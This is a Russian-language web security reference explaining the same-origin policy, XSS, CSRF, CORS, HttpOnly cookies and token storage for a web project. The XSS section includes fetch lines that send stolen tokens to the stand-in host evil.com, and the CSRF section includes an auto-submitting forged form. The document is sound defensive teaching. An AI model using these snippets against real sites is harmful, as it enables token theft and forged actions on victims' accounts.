# Справочник по веб-безопасности

## Фундамент: Same-Origin Policy (SOP)

Базовое правило браузера — каждый origin живёт в своей песочнице.

**Origin** = протокол + домен + порт. `http://localhost:5173` и `http://localhost:8080` — разные origins.

Браузер запрещает одному origin читать данные другого. Без этого правила весь веб был бы дырой.
Все остальные механизмы (CORS, SameSite, HttpOnly) — надстройки над SOP.

## XSS (Cross-Site Scripting)

**Что это:** атакующий внедряет вредоносный JS-код на твой сайт. Код исполняется в браузере жертвы в контексте твоего origin.

**Почему опасно:** скрипт уже внутри твоего origin — CORS и SameSite его не остановят. Кука уйдёт автоматически, запросы делаются от имени жертвы.

**Виды:**
- **Stored XSS** — вредоносный код сохранён в БД (поле профиля, сообщение в чате) и показывается другим пользователям
- **Reflected XSS** — вредоносный код в URL, который открывает жертва

**Что может сделать XSS-скрипт:**
```js
// Делать запросы от имени жертвы прямо в браузере
fetch('/api/posts', { method: 'POST', credentials: 'include' })

// Украсть токен из localStorage
fetch('https://evil.com?t=' + localStorage.getItem('token'))

// Дёрнуть рефреш и получить новый access-токен
fetch('/api/auth/refresh', { credentials: 'include' })
  .then(r => r.json())
  .then(d => fetch('https://evil.com?token=' + d.accessToken))
```

**Чего НЕ может XSS-скрипт:**
- Прочитать HttpOnly куку — браузер её скрывает от JS
- Достать токен из памяти JS модуля (замыкание недоступно чужому скрипту)

**Защита:**
- React экранирует всё в JSX по умолчанию — никогда не использовать `dangerouslySetInnerHTML` с пользовательскими данными
- Санитизировать входные данные на бэке (особенно всё что отображается другим пользователям)
- CSP заголовок — запрещает браузеру исполнять скрипты не из доверенных источников и отправлять данные на чужие домены

## CSRF (Cross-Site Request Forgery)

**Что это:** атакующий с `evil.com` заставляет браузер жертвы отправить запрос на твой сайт. Кука при этом прикладывается автоматически — сервер не отличит от легитимного запроса.

**Пример атаки:**
```html
<!-- evil.com — форма с автосабмитом -->
<form action="https://findme.com/api/posts" method="POST">
  <input name="text" value="спам">
</form>
<script>document.forms[0].submit()</script>
```

**Отличие от XSS:** при CSRF код атакующего на `evil.com`, при XSS — уже на твоём сайте.

**Защита — SameSite на куке:**

| Тип запроса | Strict | Lax |
|---|---|---|
| Переход по ссылке (`<a href>`, адресная строка) | ❌ | ✅ |
| `fetch` / `XHR` с чужого сайта | ❌ | ❌ |
| `<img>`, `<form>` с чужого сайта | ❌ | ❌ |

- `Lax` — разумный баланс. Ссылки из писем работают, фоновые запросы с чужого сайта — нет
- `Strict` — максимальная защита, но ссылки из любых внешних источников разлогинивают пользователя
- `None` — кука уходит отовсюду (нужно только для виджетов встраиваемых на чужие сайты)

## CORS (Cross-Origin Resource Sharing)

**Что это:** механизм браузера, позволяющий серверу явно разрешить cross-origin запросы от конкретных origins.

**Как работает:**
1. Браузер видит cross-origin запрос → отправляет preflight `OPTIONS`
2. Сервер отвечает кто разрешён в `Access-Control-Allow-Origin`
3. Если origin не в списке — браузер блокирует запрос, до сервера он не дойдёт

**Важные правила:**
- `Allow-Origin: *` + `credentials: true` — браузер запрещает такую комбинацию по спецификации
- `Allow-Origin: *` + `credentials: false` — куки не идут, но публичные данные читает любой сайт
- Для credentials нужно указывать конкретный origin: `Allow-Origin: https://mysite.com`

**Top-level навигация CORS не касается** — `<a href>`, адресная строка, `window.location.href` работают свободно. Иначе интернет бы сломался.

**В dev vs prod:**
- Dev (Vite-прокси) — браузер видит один origin `localhost:5173`, CORS не задействуется вообще
- Prod (nginx) — то же самое, один origin для фронта и API

## HttpOnly кука

**Что это:** атрибут куки, запрещающий JS читать её содержимое.

```java
ResponseCookie.from("refreshToken", value)
    .httpOnly(true)       // JS не видит через document.cookie
    .sameSite("Lax")      // защита от CSRF
    .path("/api/auth")    // уходит только на /api/auth/*, не с каждым запросом
    .secure(true)         // только по HTTPS (в проде)
    .build();
```

**Защищает от:** кражи токена через XSS — скрипт не может прочитать и унести куку.

**Не защищает от:** использования куки прямо в браузере жертвы через XSS-скрипт.

## Хранение токенов

| Место | Читается JS | Уязвим к XSS | Уязвим к CSRF |
|---|---|---|---|
| `localStorage` | ✅ | ✅ (украдут и унесут) | ❌ |
| HttpOnly кука | ❌ | ⚠️ (нельзя украсть, но можно использовать в браузере) | ✅ (защищает SameSite) |
| Память JS (переменная) | Только свой модуль | ⚠️ (украсть нельзя, но запросы делать можно) | ❌ |

**Оптимальная схема (как в этом проекте):**
- Access-токен — в памяти JS (короткоживущий, 15 мин)
- Refresh-токен — HttpOnly кука с SameSite: Lax
- В БД — только SHA-256 хэш refresh-токена (reuse detection)

## Как механизмы взаимодействуют

```
Атака с evil.com (CSRF):
evil.com → fetch findme.com
  → preflight OPTIONS → CORS блокирует (evil.com не в whitelist)
  → даже если CORS пропустил → SameSite: Lax не приложит куку к fetch

XSS на findme.com:
Скрипт уже на findme.com → same-origin
  → CORS не применяется
  → SameSite не применяется (same-site запросы)
  → HttpOnly: токен украсть нельзя, но запросы делать можно
  → Единственная защита: не допустить XSS (санитизация, React, CSP)
```

**Каждый механизм от своей атаки — они не заменяют друг друга.**
